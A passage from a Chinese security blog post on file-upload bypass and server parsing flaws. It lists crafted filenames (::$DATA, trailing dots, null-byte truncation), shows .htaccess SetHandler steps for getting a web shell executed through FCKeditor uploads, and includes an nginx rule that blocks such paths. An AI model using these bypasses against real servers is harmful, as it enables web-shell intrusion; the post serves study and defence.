+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( $fastcgi_script_name ~ ..*/.*php ) &#123;</span><br><span class="line">　　<span class="keyword">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-4-4-IIS7-5解析漏洞"><a href="#2-4-4-IIS7-5解析漏洞" class="headerlink" title="2.4.4-IIS7.5解析漏洞"></a>2.4.4-IIS7.5解析漏洞</h4><ul>
+<li>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</li>
+</ul>
+<h3 id="3-5-配合操作系统文件命令规则"><a href="#3-5-配合操作系统文件命令规则" class="headerlink" title="3.5-配合操作系统文件命令规则"></a>3.5-配合操作系统文件命令规则</h3><ul>
+<li><p>上传不符合windows文件命名规则的文件名</p>
+<ul>
+<li><p>会被windows系统自动去掉不符合规则符号后面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.（点号去掉）</span><br><span class="line">test.asp(空格)（空格去掉）</span><br><span class="line">test.php:1.jpg（冒号去掉）</span><br><span class="line">test.php::$DATA（冒号去掉）</span><br><span class="line">shell.php::$DATA…….（冒号去掉）</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>会被windows系统自动去掉不符合规则符号后面的内容</p>
+<ul>
+<li>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-6-CMS及编辑器漏洞及-htaccess"><a href="#3-6-CMS及编辑器漏洞及-htaccess" class="headerlink" title="3.6-CMS及编辑器漏洞及.htaccess"></a>3.6-CMS及编辑器漏洞及.htaccess</h3><ul>
+<li><p>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过</p>
+</li>
+<li><p>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
+</li>
+<li><p>.htaccess利用步骤</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个htaccess文件:</span><br><span class="line">代码内容:</span><br><span class="line">&lt;FilesMatch “_php.gif”&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">2.实用编辑器上传htaccess文件.</span><br><span class="line">http://www.2cto.com /FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">http://www.2cto.com /FCKeditor/editor/filemanager/browser/default/connectors/test.html</span><br><span class="line">3.上传shell.php.gif</span><br><span class="line">4.上传后shell.php.gif, 会自动被改名为shell_php.gif</span><br><span class="line">5.访问http://www.2cto.com /上传目录/shell_php.gif</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="3-7-配合其它规则"><a href="#3-7-配合其它规则" class="headerlink" title="3.7-配合其它规则"></a>3.7-配合其它规则</h3><ul>
+<li><p>0x00截断</p>
+<ul>
+<li><p>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
+</li>
+<li><p>test.php(0x00).jpg</p>
+<p>  test.php%00.jpg</p>
+</li>
+<li><p>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p>
+</li>
+<li><p>伪代码演示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line">type =gettype(name)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-8-WAF绕过"><a href="#3-8-WAF绕过" class="headerlink" title="3.8-WAF绕过"></a>3.8-WAF绕过</h3>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/上传解析漏洞/" rel="tag"># 上传解析漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/注入相关问题/" rel="next" title="注入相关问题">
+                <i class="fa fa-chevron-left"></i> 注入相关问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/编辑器上传漏洞/" rel="prev" title="编辑器上传漏洞">
+                编辑器上传漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#上传解析相关"><span class="nav-text">上传解析相关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-简介"><span class="nav-text">01-简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-文件上传校验姿势"><span class="nav-text">02-文件上传校验姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-客户端校验"><span class="nav-text">2.1-客户端校验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-服务端校验"><span class="nav-text">2.2-服务端校验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-文件上传绕过校验"><span class="nav-text">03-文件上传绕过校验</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-客户端绕过"><span class="nav-text">3.1-客户端绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-服务端绕过"><span class="nav-text">3.2-服务端绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-配合文件包含漏洞"><span class="nav-text">3.3-配合文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-配合服务器解析漏洞"><span class="nav-text">3.4-配合服务器解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-1-IIS5-x-6-x"><span class="nav-text">3.4.1-IIS5.x-6.x</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-4-2-apache"><span class="nav-text">3.4.2-apache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-2-nginx解析漏洞"><span class="nav-text">2.4.2-nginx解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-4-IIS7-5解析漏洞"><span class="nav-text">2.4.4-IIS7.5解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-配合操作系统文件命令规则"><span class="nav-text">3.5-配合操作系统文件命令规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-CMS及编辑器漏洞及-htaccess"><span class="nav-text">3.6-CMS及编辑器漏洞及.htaccess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-配合其它规则"><span class="nav-text">3.7-配合其它规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-8-WAF绕过"><span class="nav-text">3.8-WAF绕过</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
